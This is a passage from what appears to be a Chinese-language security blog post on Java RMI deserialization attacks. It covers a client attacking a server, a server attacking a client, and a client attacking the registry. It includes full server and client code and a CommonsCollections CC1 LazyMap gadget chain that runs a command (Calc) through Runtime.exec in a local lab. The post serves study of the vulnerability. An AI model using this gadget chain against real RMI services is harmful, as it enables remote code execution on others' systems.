alt="image.png"><br>上面是攻击的是参数为Object类型的漏洞函数，因为基本类型不会走反序列化，是可以成功的。<br>但是要求Server端存在一个参数为Object的函数，攻击面还不够广，于是我们思考，如果Server端的接口里的漏洞函数的参数是自定义的HelloObject类，而服务端接口的参数我们还是传Object，是否能够利用成功？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">// public void vulFunc(Object o) throws RemoteException;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(HelloObject o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @Override</span></span><br><span class="line">    <span class="comment">// public void vulFunc(Object o) throws RemoteException &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(HelloObject o)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(HelloObject o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1.get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// invoke the method of remote object</span></span><br><span class="line">        stub.vulFunc(getCCPayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先运行Server端启动代码，再运行Client端启动代码，发现报下面的错误：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694944516004-d0135740-81c7-4fb4-a772-1a8c77f5968b.png" alt="image.png"><br>看报错很简单，Server端不支持Object类型参数的函数，那是不是就利用不了了？<br>不卖关子，在这个<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides%20Exploiting%20RMI%20Services.pdf">PPT</a>中介绍了4种方式，绕过判断实现反序列化，这里我们选最简单的debugger方法。<br>正常启动Server端启动代码，DEBUG启动Client端启动代码，hook点在invokeRemoteMethod<br>右键method，点击Evaluate Expression，会弹出修改method的对话框<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694945020036-b6f51293-2249-4990-87b7-4a36f8cee15d.png" alt="image.png"><br>把method改成参数为HelloObject类型的漏洞函数，点击Evaluate赋值。<br>注意：这里能改是因为Client端的接口既写了参数Object的函数，又写了参数HelloObject的函数</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694945180999-77be06d6-1ccf-43c1-a134-2ab47419d5bf.png" alt="image.png"></p><p>一路consume，也成功执行CC1代码。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694945424011-cec6eebd-4ccd-4ba5-b73a-0da12ecdb47d.png" alt="image.png"></p><h2 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h2><p>攻击原理：客户端调用远程对象的函数，函数在服务端执行完毕以后，函数的返回结果会在服务端序列化，通过网络连接传输，再在客户端反序列化，那么如果恶意的服务端返回一个恶意的函数执行结果，客户端就会受到反序列化攻击。和客户端攻击服务端是同一个流程下的问题。<br><strong>详情见：客户端调用远程对象的方法并获取返回结果</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulFunc</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulFunc</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> getCCPayload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulFunc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        stub.vulFunc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先运行Server端的启动代码，再运行Client端的启动代码，成功执行CC1命令。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695110240928-9e8ce206-fae1-4f79-8d0a-8305d8f35eb6.png" alt="image.png"></p><h2 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h2><p>攻击原理：客户端主要是lookup和unbind，这两个函数接收一个客户端传过来的String类型的参数，然后去查找对应的绑定的远程对象是否存在，但是实际上，<strong>注册中心是先把传过来的String类型参数反序列化，再进行类型转换的</strong>，在类型转换之前反序列化攻击就可以完成，那么我们如果lookup传一个恶意对象，注册中心就会反序列化RCE。<br><strong>详情见：注册中心收到查询请求并返回远程对象的代理</strong><br>需要注意的是，lookup方法本身并不支持传输一个恶意对象，所以需要我们自己实现封装一个lookup方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 